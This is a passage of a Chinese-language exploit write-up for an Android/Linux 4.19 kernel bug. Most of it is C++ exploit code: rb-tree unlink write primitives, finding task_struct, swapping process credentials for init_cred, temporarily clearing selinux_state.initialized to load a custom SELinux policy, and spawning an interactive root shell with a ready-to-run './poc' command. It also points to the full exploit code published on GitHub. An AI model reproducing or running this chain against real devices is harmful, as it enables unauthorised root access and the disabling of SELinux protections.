幻影左孩子VICTIM 	幻影右孩子0
```

摘node第一件事：更新孩子的父亲。右孩子为空，则只更新左孩子，得：

```cpp
rb_left->parent_color = node->parent_color // 子承父色
等价：*(u64*)VICTIM = PAYLOAD // 第一笔写，即我们需要的写原语本身
```

第二件事：更新父亲的孩子。这一步显然应该设置：

```text
parent->rb_left = node->left
```

但是父节点是幻影节点（不存在的节点），于是发生了错误。具体看内核源码：

```cpp
// old = node, new = node->rb_left
static inline void __rb_change_child(old, new, parent, root) {
    if (parent) {
        if (parent->rb_left == old)  //parent = PAYLOAD，是幻影节点，所以parent->rb_left是野指针解引用，不可能等于node
            WRITE_ONCE(parent->rb_left,  new);   
        else                         
            WRITE_ONCE(parent->rb_right, new);   // 于是走这个分支
    } else WRITE_ONCE(root->rb_node, new);
}
```

这就是第二笔写（寄生写）：

```text
parent->rb_right = node->rb_left
等价于：*(u64*)(PAYLOAD+8) = VICTIM
```

所以效果是：之前的waiter布局（0号布局）的寄生写落在PAYLOAD，现在改到了**PAYLOAD+8**。

另一个副作用：`if (parent->rb_left == old)`要求 `(u64*)(PAYLOAD+0x10)`可解引用（可读）。这个一般都没问题，合法的内核指针基本都能读。

#### 3.3.3.2 waiter布局2

在waiter所在节点是叶子节点时，不存在“更新waiter节点的孩子的父指针”，因此只剩一笔写：更新waiter父亲的子节点为空，这就是一笔没有副作用的8字节0写原语：

```cpp
// tools.cpp
// *VICTIM = 0
    waiter_layout[2] = {
        VICTIM - 8,
        0,
        0,
        0, 0, 0,
        INIT_TASK,
        LOCK,
        0, 130, 0
    };
```

这是相当重要的功能，后续我们需要它修复寄生写为0写（先用0/1号，再把寄生写改成0）。

### 3.3.4 加载自定义SELinux policy

写原语支持写8字节指针，第一个想到的就是换当前进程的cred（换成init_cred），不过有几个麻烦：

1. 麒麟芯片（尤其是5.10内核）有HKIP和HEE机制，定期扫描是否有异常的uid = 0进程，扫到立刻杀死。这种防护机制基于hypervisor。幸运的是，我们的DBY是骁龙4.19内核，上述保护全部没有。即便你的设备有，参考资料的`关闭SELinux文章/`也提供了应对措施。
2. 换成uid = 0 的cred后，要获得交互式shell，需要调用exec，而kernel域exec到shell正是SELinux禁止的。这是DBY和所有设备都有的麻烦。

关于第二点，我们的解决办法是：exec前加载一份自定义SELinux policy，这份策略加载后，效果等同于关闭SELinux。

#### 3.3.4.1 找到当前进程task_struct

cred是task_struct的字段，还有个real_cred也要换掉。

要找当前进程的task_struct，我们需要遍历内核中所有task_struct。这些task_struct由字段`tasks`连接，是双向链表：

```cpp
struct list_head {
        struct list_head *         next;                 /*     0     8 */
        struct list_head *         prev;                 /*     8     8 */

        /* size: 16, cachelines: 1, members: 2 */
        /* last cacheline: 16 bytes */
};
```

于是我们从init_task.tasks->prev往前找，它是最新创建的task_struct。

此外我们要修改当前进程的comm（进程名），每次遍历用comm字段判断是否找到。

```cpp
natsu@ubuntu:~/ghostlock/pad-res/out-qemu$ pahole vmlinux -C task_struct | grep -C 5 1720
/* XXX 2 bytes hole, try to pack */

int                        rcu_tasks_idle_cpu;   /*  1700     4 */
struct list_head           rcu_tasks_holdout_list; /*  1704    16 */
struct sched_info          sched_info;           /*  1720    32 */
/* --- cacheline 27 boundary (1728 bytes) was 24 bytes ago --- */
struct list_head           tasks;                /*  1752    16 */
···
char                       comm[16];             /*  2448    16 */
```

这样看起来要读很多字段。我们知道读原语有寄生写，联想到之前的可变长有界读，干脆在task_struct里选择一个8字节**可牺牲字段**，从这里开始一口气读到comm，中间覆盖了其他要读的字段。这个可牺牲字段就是`sched_info.pcount`：

```cpp
natsu@ubuntu:~/ghostlock/pad-res/out-qemu$ pahole vmlinux -C sched_info
struct sched_info {
        long unsigned int          pcount;               /*     0     8 */
        long long unsigned int     run_delay;            /*     8     8 */
        long long unsigned int     last_arrival;         /*    16     8 */
        long long unsigned int     last_queued;          /*    24     8 */
};
```

据GPT所述，这是一种统计数据，内核很少主动用。保险起见，寄生写落进去后再用2号布局改成0：

```cpp
void read_comm_prev(unsigned long task, unsigned long &comm, unsigned long &prev_list_head) {
    std::vector<unsigned long> data;
    Prim::getInstance().read_link(task + 1720 - kaslr_slide, data, 736 / 8, 0); //带寄生写，读到comm为止
    comm = *data.rbegin();
    prev_list_head = data[5];
    Prim::getInstance().write_link(task + 1720 - kaslr_slide, 0, 2); //寄生写改成0
}
```

#### 3.3.4.2 父子进程通信

为什么不能本进程直接加载？因为加载policy要kernel域+uid=0。换成init_cred后，SELinux禁止kernel域向终端输出，所以难以通信。

但是子进程可以和父进程用共享内存通信。模型是：

```cpp
struct ShareMem {
    std::atomic<int> cmd = 0; // 父要求子做的函数调用
    std::atomic<int> rc = 0; // 子进程调用某个函数返回码
    std::atomic<int> err = 0; // 子进程 errno
    std::atomic<int> seq = 0; // 父：已下发的序号
    std::atomic<int> ack = 0; // 子：已完成的序号
};
···
void *mem = mmap(nullptr, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
auto sh = new (mem)ShareMem;//跑std::atomic构造函数
```

cmd的枚举：

```cpp
//ShareMem::cmd
enum {
    CMD_NULL = 0, CMD_GETUID = 1, CMD_OPEN_LOAD = 2, CMD_GENERATE_AVC = 3,
    CMD_WRITE_LOAD = 4, CMD_CLOSE = 5
};
```

工作原理：

1. 父进程下发命令时，从枚举选一个设置cmd，并++seq；
2. 子进程无限循环轮询ack != seq，条件为true时读取cmd，执行对应函数，并设置返回码rc和err（全局errno），最后++ack
3. 父进程++seq后轮询ack == seq，条件为true时读取rc和err。

#### 3.3.4.3 改子进程cred

首先要找到子进程task_struct，父进程用task_struct.children->next连接子进程task_struct.sibling：

```cpp
//简化逻辑：
Prim::getInstance().read_link(task + 1720 - kaslr_slide, data, 736 / 8, 0);
Prim::getInstance().write_link(task + 1720 - kaslr_slide, 0, 2); //寄生写改成0
unsigned long child_node = data[40];
task = child_node - 2056; // 注意parent.children->next不是children字段，是slibling
```

由于只需一次就能找到，不像之前找父进程自己的task_struct要遍历1-3次，所以可以不改子进程名。当然，也可以做双重确认（我的代码）。

此外，还要保存好原始cred和real_cred指针：

```cpp
child_cred_bak = *(data.rbegin()+1);
child_real_cred_bak = *(data.rbegin()+2);
```

这是因为，init_cred有引用计数，如果所在进程退出，引用计数减少，减到0就会释放内存。但是内核里有其他进程还在用，导致panic。

所以当policy加载完，一定要换回原 cred 和 real_cred 才能退出子进程。

现在可以安全换成init_cred：

```cpp
write_1_rt(child_task + OFF_REAL_CRED, init_cred); // write_1_rt是指1号布局写原语，参数为运行时地址
write_1_rt(child_task + OFF_CRED, init_cred);
```

不过有个小问题：寄生写踩掉了*(init_cred+8)，这部分是gid和suid。要改回0，只能走系统调用，需要init_cred权限。所以留到父进程换成init_cred时改（最后一次寄生写）：

```cpp
if (syscall(SYS_setgid, 0) < 0) {
    print("setgid失败：",strerror(errno));
    exit(1);
}
if (syscall(SYS_setresuid, -1, -1, 0) < 0) { // 第三个参数是suid
    print("setsuid失败：",strerror(errno));
    exit(1);
}
```

#### 3.3.4.4 加载自定义policy

原策略neverallow加载自定义policy，不过那只是编译器断言。

我们现在只要临时关闭SELinux，加载完再打开就OK，关闭方法是 **写selinux_state.initialized = 0**（这是一个bool变量），放行所有请求：

```cpp
Prim::getInstance().write_link(LINK_SELINUX_STATE, 0, 2); 
```

布局：

```cpp
struct selinux_state {
        bool                       disabled;             /*     0     1 */
        bool                       checkreqprot;         /*     1     1 */
        bool                       initialized;          /*     2     1 */
        bool                       policycap[6];         /*     3     6 */
        bool                       android_netlink_route; /*     9     1 */

        /* XXX 6 bytes hole, try to pack */

        struct selinux_avc *       avc;                  /*    16     8 */
        struct selinux_ss *        ss;                   /*    24     8 */

        /* size: 32, cachelines: 1, members: 7 */
        /* sum members: 26, holes: 1, sum holes: 6 */
        /* last cacheline: 32 bytes */
};
```

该方法之所以不能直接用，是因为会导致屏幕无响应，只剩adb和内核。方案参考自参考资料的`关闭SELinux文章/`。

然后子进程应该加载策略——但是kernel域禁止写文件，initialized = 0无法加载策略。

这个死循环可以这样打破：SELinux的每次放行和拒绝都会生成一个缓存节点（avc），稍后同样的请求先看有没有缓存。

所以我们在initialized = 0 **生成avc节点**，恢复initialized = 1，再写入policy文件，命中缓存，写入放行。

一个小细节：生成avc节点本身就是一次“写文件”操作，但是又不能真的写进去（initialized = 0下可能发生意外），所以我们写64MB触发EFBIG：

```cpp
notify_child(sh, CMD_GENERATE_AVC);
if (sh->err != EFBIG) {
    print("子进程未触发EFBIG, errno=", strerror(sh->err));
    clean_child(child_pid, child_task, sh);
    exit(1);
}
print("子进程触发EFBIG成功，AVC节点已生成");
```

这样就生成了一个avc节点，打开SELinux也放行加载策略：

```cpp
Prim::getInstance().write_link(LINK_SELINUX_STATE, LINK_LOCK_START+8, 1);
print("initialized已写回1，设备屏幕应恢复正常");
notify_child(sh, CMD_WRITE_LOAD);
// 子进程换回原始cred，防止退出减少init_cred引用计数
clean_child(child_pid, child_task, sh);
```

注意我们是把LINK_LOCK_START+8写进了LINK_SELINUX_STATE。

这是因为bool是1字节，我们只能写8字节，而`LINK_LOCK_START+8`低2位是0x08，实测只要不是0x00就为true。

策略文件的编译过程就省略了，直接交给AI。

### 3.3.5 返回交互式root shell

父进程也换成init_cred，修复寄生写、返回交互式root shell：

```cpp
write_1_rt(task + OFF_REAL_CRED, init_cred);
write_1_rt(task + OFF_CRED, init_cred);
syscall(SYS_setgid, 0)
syscall(SYS_setresuid, -1, -1, 0)
char *argv[] = {(char*)"/system/bin/sh", (char*)"-i", nullptr};
char *envp[] = {
    (char*)"PATH=/system/bin",
    (char*)"TERM=xterm-256color",
    (char*)"HOME=/", nullptr
};
execve("/system/bin/sh", argv, envp);
```

总的来说，你只需要这样运行二进制：

```sh
SLOT=28 ROOTSHELL=1 ./poc
```

数秒就能返回交互式root shell。

## 3.4 root管理器

最简单的方案是magisk接管（注意不要点修复环境，不然他修改系统分区，下次启动bootloader校验不通过就开不了机了），KSU适配难度大。当然，如果需要过环境，最简单的是手写命令行管理器。

# 附录A：参考资料清单

特别感谢 `deepseek harness`和`GLM` ，绝大多数实验过程是它帮我试错，还提出了许多天才般的想法。

全放在同目录下 `参考资料\` 。

## 官方资料

官方分析文章已经提取成文本文件：

```text
官方博客原文-x86.txt
官方博客原文-安卓.txt
```

## 我的资料

文件较多，请直接看文件名。

## 完整利用代码

这篇文档随GitHub发布，利用代码在仓库里。我的github账号名是natsuu233。、

## 备用联系方式

如果GitHub被拿下了，这个应该能联系到我：natsuu233@outlook.com

# 附录B：学习路线

完整看懂这份文档和代码，你至少需要学：

1. C/C++基础语法：看B站的黑马程序员C++课程，学完C++自然会C。我的代码用了一些基本的C++并发原语。实在不懂没关系，本文档外的不算重点
2. 数据结构基础：看书《大话数据结构》，建议通读，虽然没讲红黑树，但讲了平衡二叉树基本原理，看完后红黑树就很好理解了
3. 操作系统基础：看书《操作系统导论》，几乎全是重点

其他杂七杂八的，比如虚拟机、agent使用技巧，都很简单，遇到再学。

